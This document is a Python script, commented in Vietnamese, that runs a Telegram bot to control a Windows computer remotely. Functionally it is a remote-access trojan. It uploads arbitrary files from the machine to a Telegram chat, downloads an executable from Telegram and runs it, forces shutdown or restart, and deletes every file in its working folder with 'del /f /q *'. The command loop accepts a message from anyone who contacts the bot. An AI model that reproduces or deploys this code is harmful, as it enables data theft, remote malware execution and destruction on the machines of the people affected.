import os
import requests
import subprocess

# Cấu hình bot Telegram
TELEGRAM_BOT_TOKEN = "your_bot_token"  # Thay bằng token bot của bạn
TELEGRAM_CHAT_ID = "your_chat_id"      # Thay bằng chat ID của bạn

# Gửi tin nhắn đến Telegram
def send_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": message}
    response = requests.post(url, data=data)
    if response.status_code != 200:
        print(f"Error sending message: {response.text}")

# Gửi file qua Telegram
def send_file(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as file:
            data = {"chat_id": TELEGRAM_CHAT_ID}
            files = {"document": file}
            response = requests.post(url, data=data, files=files)
        if response.status_code == 200:
            send_message(f"File {file_path} sent successfully.")
        else:
            send_message(f"Failed to send file: {response.text}")
    except FileNotFoundError:
        send_message(f"File not found: {file_path}")

# Tải và thực thi file từ Telegram
def download_and_execute(file_id):
    file_info_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getFile"
    response = requests.get(file_info_url, params={"file_id": file_id})
    if response.status_code == 200:
        file_info = response.json()
        file_path = file_info["result"]["file_path"]
        download_url = f"https://api.telegram.org/file/bot{TELEGRAM_BOT_TOKEN}/{file_path}"
        file_response = requests.get(download_url)
        if file_response.status_code == 200:
            local_file_path = "downloaded_file.exe"
            with open(local_file_path, "wb") as file:
                file.write(file_response.content)
            send_message("File downloaded successfully. Executing...")
            os.system(f"start {local_file_path}")
        else:
            send_message("Failed to download file.")
    else:
        send_message("Invalid file ID.")

# Thực thi lệnh từ xa
def execute_command(command):
    if command.startswith("list_files"):
        path = command.split(" ", 1)[1] if " " in command else "."
        if os.path.exists(path):
            files = os.listdir(path)
            result = "\n".join(files) if files else "No files found."
        else:
            result = f"Path not found: {path}"
    elif command.startswith("send_file"):
        file_path = command.split(" ", 1)[1]
        send_file(file_path)
        result = f"Attempted to send file: {file_path}"
    elif command.startswith("download_execute"):
        file_id = command.split(" ", 1)[1]
        download_and_execute(file_id)
        result = f"Attempted to download and execute file with ID: {file_id}"
    elif command == "shutdown":
        os.system("shutdown /s /t 0")
        result = "Shutting down the computer..."
    elif command == "restart":
        os.system("shutdown /r /t 0")
        result = "Restarting the computer..."
    elif command == "reset":
        os.system("del /f /q *")  # Xóa file trong thư mục hiện tại
        result = "Resetting the computer (simulated)."
    else:
        result = "Unknown command."
    return result

# Lắng nghe lệnh từ Telegram
def start_bot():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    send_message("Bot started. Send commands to control your computer.")

    while True:
        response = requests.get(url).json()
        if "result" in response:
            for update in response["result"]:
                if last_update_id is None or update["update_id"] > last_update_id:
                    last_update_id = update["update_id"]
                    if "message" in update and "text" in update["message"]:
                        command = update["message"]["text"]
                        result = execute_command(command)
                        send_message(result)

if __name__ == "__main__":
    start_bot()
